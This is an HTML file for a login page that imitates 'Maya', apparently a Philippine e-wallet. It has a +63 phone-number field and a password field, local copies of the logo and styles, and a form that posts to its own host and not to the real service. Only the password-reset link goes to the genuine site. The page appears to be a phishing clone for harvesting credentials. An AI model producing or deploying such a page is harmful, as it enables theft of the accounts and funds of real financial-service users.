<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style/maya.css">
    <link rel="icon" href="./style/favicon.png">
    <title>Maya | Login</title>
</head>
<body>
<div class="container">
    <div class="login">
        <div class="logo">
            <img height="120px" src="./style/maya.png" alt="maya-logo">
        </div>
        <form action="" method="POST">
            <div class="input1">
                <p>+63</p>
                <div class="box">
                    <input id="username" type="text" name="username" placeholder="Phone number" required>
                </div>
            </div>
            <div class="input2">
                <label for="password">Password</label>
                <input id="password" type="password" name="password" placeholder="Enter password" required>
                <img id="eye" height="30px" src="./style/eyelash.png" alt="eyelash">
            </div>
            <div class="forgot-password">
                <a href="https://online.maya.ph/forgot-password">Forgot your password?</a>
            </div>
            <div class="btn">
                <button id="btn" type="submit">Log In</button>
            </div>
        </form>
    </div>
</div>
<script>
    const password = document.getElementById("password");
    const eye = document.getElementById("eye");

    eye.onclick = function (){
        if(password.type === "password"){
            password.type = "text";
            eye.src = "./style/eye-scan.png"
        }else{
            password.type = "password";
            eye.src = "./style/eyelash.png"
        }
    }

    const username = document.getElementById("username");
    const button = document.getElementById("btn");

    button.disabled = true
    function checkFields() {
        if (username.value.length > 0 && password.value.length > 0 && (username.value.startsWith("9") || username.value.startsWith("09"))) {
            button.disabled = false;
        } else {
            button.disabled = true;
        }
    }
    
    username.addEventListener("keyup", checkFields);
    password.addEventListener("keyup", checkFields);
</script>
</body>
</html>